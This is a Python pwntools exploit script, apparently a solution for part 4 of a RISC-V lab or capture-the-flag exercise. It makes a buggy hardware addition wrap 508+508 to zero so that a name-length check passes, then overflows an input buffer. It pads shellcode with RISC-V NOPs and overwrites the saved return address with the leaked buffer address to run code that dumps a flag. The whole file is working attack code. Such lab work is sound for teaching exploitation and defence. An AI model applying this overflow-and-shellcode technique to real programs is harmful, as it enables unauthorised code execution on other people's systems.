#!/usr/bin/env python3
"""
Part 4: exploit bogus add (0x1FC + 0x1FC => 0) to bypass fname_len + lname_len > 768,
overflow inputbuf, return into shellcode at printed inputbuf address.

Requires: `make -C part4 dump_flag.bin` (see part4/Makefile).
"""
import os
import re
import struct

from pwn import context, process, remote

context.log_level = "info"
context.arch = "riscv32"

LAB_ROOT = os.path.dirname(os.path.abspath(__file__))
PART4 = os.path.join(LAB_ROOT, "part4")
DUMP_BIN = os.path.join(PART4, "dump_flag.bin")

# Local simulator (default) or remote grading service.
# io = remote("127.0.0.1", 31337)
io = process([os.path.join(LAB_ROOT, "run.sh"), "part4"], cwd=LAB_ROOT)

# 508 == 0x1FC; hardware add gives 0 so 508+508 "is not" > 768.
FIRSTNAME_LEN = b"508\n"
LASTNAME_LEN = b"508\n"

with open(DUMP_BIN, "rb") as f:
    shellcode = f.read()

NOP = struct.pack("<I", 0x00000013)  # addi x0, x0, 0
RET_OFF = 792  # bytes from start of inputbuf to saved ra (see shd_main prologue)
assert len(shellcode) % 4 == 0
assert len(shellcode) <= RET_OFF

pre = io.recvuntil(b"How long is your first name: ")
m = re.search(rb"inputbuf is at (0x[0-9A-Fa-f]+)", pre)
if not m:
    raise RuntimeError(f"could not parse inputbuf address from: {pre!r}")
inputbuf_addr = int(m.group(1), 16)

io.send(FIRSTNAME_LEN)
io.recvuntil(b"How long is your last name: ")
io.send(LASTNAME_LEN)
io.recvuntil(b"Ok, tell me your first name: ")

pad_len = RET_OFF - len(shellcode)
assert pad_len % 4 == 0
buf = shellcode + NOP * (pad_len // 4) + struct.pack("<I", inputbuf_addr)
assert len(buf) == RET_OFF + 4
buf += b"X" * (1014 - len(buf))
assert len(buf) == 1014

# serial_read(..., 508): last byte of each 508-byte write is forced to NUL; overlap strategy.
wire1 = bytearray(508)
wire1[:507] = buf[:507]
wire1[507] = 0x41

wire2 = bytearray(508)
wire2[:507] = buf[507:1014]
wire2[507] = 0x41

io.send(bytes(wire1))
io.recvuntil(b"And your last name: ")
io.send(bytes(wire2))

io.interactive()
